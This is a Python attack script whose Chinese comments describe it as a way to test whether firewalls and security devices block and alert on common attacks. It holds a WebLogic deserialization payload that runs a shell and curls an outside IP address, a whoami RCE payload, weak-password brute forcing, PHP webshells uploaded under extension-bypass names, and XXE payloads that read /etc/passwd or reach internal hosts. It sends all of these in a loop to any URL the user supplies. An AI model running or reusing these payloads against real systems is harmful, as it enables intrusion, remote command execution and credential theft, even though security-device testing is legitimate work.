# -*- encoding: utf-8 -*-
# python3
# 此脚本主要对一些常用漏洞和payload构造请求发送到指定目标，用于测试防火墙等安全设备对攻击的拦截与告警功能。

import requests
import datetime
import time
import json
import os
from optparse import OptionParser
import base64

requests.packages.urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 0
succes_count = 0
fail_count = 0


# proxy = {
#     'http': 'http://127.0.0.1:8080'
# }


def getip():
    r = requests.get('http://ip.360.cn/IPShare/info', verify=False)
    ip = json.loads(r.content)['ip']
    return ip


def geturl(payload):
    global fail_count
    global succes_count
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0'
    }
    try:
        requests.get(url + payload, headers=heads, timeout=3, verify=False)
        succes_count += 1
    except:
        fail_count += 1


def attackweakpasswd():
    global fail_count
    global succes_count
    user = ['admin', 'user', 'test', 'administrator', 'test123']
    passwd = ['123456', 'admin', 'admin123', '1234567', 'password']
    heads = {
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'PHPSESSID=c3v5q0q4pum7hmfhmjl7qr30u4',
        'Upgrade-Insecure-Requests': '1'
    }
    for u in user:
        for p in passwd:
            data = 'login_user=' + u + '&login_password=' + p + '&mysubmit=%E7%99%BB%E5%BD%95'
            try:
                requests.post(url + "/login.php", headers=heads, data=data, verify=False, timeout=3)
                succes_count += 1
            except:
                fail_count += 1
            data = 'login_user=' + str(base64.b64encode(u.encode('utf-8'))) + '&login_password=' + str(base64.b64encode(
                p.encode('utf-8'))) + '&mysubmit=%E7%99%BB%E5%BD%95'
            try:
                requests.post(url + "/login.php", headers=heads, data=data, verify=False, timeout=3)
                succes_count += 1
            except:
                fail_count += 1
            heads['Authorization'] = str(base64.b64encode((u + ':' + p).encode('utf-8')))
            try:
                requests.post(url + "/login.php", headers=heads, verify=False, timeout=3)
                succes_count += 1
            except:
                fail_count += 1


def attackweblogic():
    global fail_count
    global succes_count
    heads = {
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0'
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>curl http://101.200.127.171/sgccccccccc</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
    data2 = '''<?xmlversion="1.0"encoding="utf-8"?><soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>fff</wsa:Action><wsa:RelatesTo>hello</wsa:RelatesTo><work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java><voidclass="weblogic.utils.Hex"method="fromHexString"id="cls"><string></string></void><voidclass="org.mozilla.classfile.DefiningClassLoader"><voidmethod="defineClass"><string>com.supeream.exploits.XmlExp</string><objectidref="cls"></object><voidmethod="newInstance"><voidmethod="say"id="proc"><string>whoami</string></void></void></void></void></java>]]></string></void></class></string></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
    try:
        requests.post(url + "/wls-wsat/CoordinatorPortType11",
                      headers=heads,
                      data=data, verify=False, timeout=3)
        succes_count += 1
        requests.post(url + "/_async/AsyncResponseService",
                      headers=heads,
                      data=data2, verify=False, timeout=3)
        succes_count += 1
    except:
        fail_count += 1


def attackupload():
    global fail_count
    global succes_count
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
    }
    files = {}
    file_nmae = ['test.php .jpg', 'test.pHp3.xxx', 'test.phtml', 'test.pht%00.jpg', 'test.pHp5', '.htaccess',
                 'test.pHp4%00.jpg', 'test.pht', 'test.pHp', 'test.html.xxx']
    shell = [
        "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';die;}?>",
        "<?php $e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, $e);?>",
        "<?php $e = $_REQUEST['e'];$arr = array('test', $_REQUEST['pass']);uasort($arr, $e);?>",
        "<?php filter_var_array( array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));?>",
        "<?php $string=@$_POST['_']; eval('system('net user');');?>"]
    for f in file_nmae:
        for s in shell:
            files['files'] = (f, s, 'application/octet-stream')
            try:
                requests.post(url + "/upload.php", headers=heads, files=files, verify=False, timeout=3)
                succes_count += 1
            except:
                fail_count += 1


def attackxxe():
    global fail_count
    global succes_count
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-type': 'text/xml'
    }
    xxe_payload = [
        """
        <?xml version="1.0"?>
<!DOCTYPE ANY [
         <!ENTITYcontent SYSTEM"file:///etc/passwd">]>
   <name>&content;</name>
        """,
        """
        <?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY contentSYSTEM "http://10.165.89.150:88">]>
<name>&content;</name>
        """,
        """
        <?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITYcontent SYSTEM " http://<oursite>/hhhhhhh">]>
<name>&content;</name> 
        """
    ]
    for x in xxe_payload:
        try:
            requests.post(url + "/login.php", headers=heads, data=x, verify=False, timeout=3)
            succes_count += 1
        except:
            fail_count += 1


def attack():
    if ltype == 'weblogic':
        while 1:
            if (datetime.datetime.now() - start_time).seconds > int(ltime):
                break
            else:
                attackweblogic()
    elif ltype == 'weakpasswd':
        while 1:
            if (datetime.datetime.now() - start_time).seconds > int(ltime):
                break
            else:
                attackweakpasswd()
    elif ltype == 'upload':
        while 1:
            if (datetime.datetime.now() - start_time).seconds > int(ltime):
                break
            else:
                attackupload()
    elif ltype == 'xxe':
        while 1:
            if (datetime.datetime.now() - start_time).seconds > int(ltime):
                break
            else:
                attackxxe()
    else:
        while 1:
            if (datetime.datetime.now() - start_time).seconds > int(ltime):
                break
            else:
                for payload in payloads:
                    if (datetime.datetime.now() - start_time).seconds < int(ltime):
                        geturl(payload)
                    else:
                        break


def main():
    usage = "usage: %prog [options] args"
    parser = OptionParser(usage)
    parser.add_option("--url",
                      dest='url',
                      help=u"攻击对象，eg:http://192.168.111.1",
                      default=180)
    parser.add_option("--time",
                      dest='time',
                      help=u"攻击时间，单位：秒，默认180s",
                      default=180)
    parser.add_option("--type",
                      dest='type',
                      help=u"攻击类型，可选参数：sqlinject（sql注入）、struts2、dirscan（目录扫描）、xss、weblogic、rce（命令注入）、codeinject（代码注入）、info（信息泄露）、weakpasswd（弱口令与明文传输）、upload（文件上传）、XXE（XML实体注入）")

    (options, args) = parser.parse_args()

    global url, ltype, ltime, payloads, start_time
    if not options.type or not options.url:
        parser.print_help()
        print('\nexample:python Main.py --url http://www.test.com --type dirscan --time 10')
        exit()

    else:
        url = options.url
        ltype = options.type
        ltime = options.time
        start_time = datetime.datetime.now()
        pstart_time = start_time.strftime('%Y-%m-%d %H:%M:%S')

    file = './dict/' + ltype + '.dict'
    if not os.path.exists(file):
        print('请检查攻击类型是否正确！')
        exit()
    payloads = open(file).readlines()
    # print('出口地址：' + getip())
    # print('出口地址：' + '1.1.7.2')
    print('目标地址：' + url)
    print('攻击类型：' + ltype)
    print('设定时长：' + ltime + 's')
    print('开始时间：' + pstart_time)
    attack()
    print('结束时间：' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    # print('成功请求次数：', succes_count)
    # print('请求失败次数：', fail_count)
    print('总共请求次数: ', succes_count + fail_count)


if __name__ == "__main__":
    main()
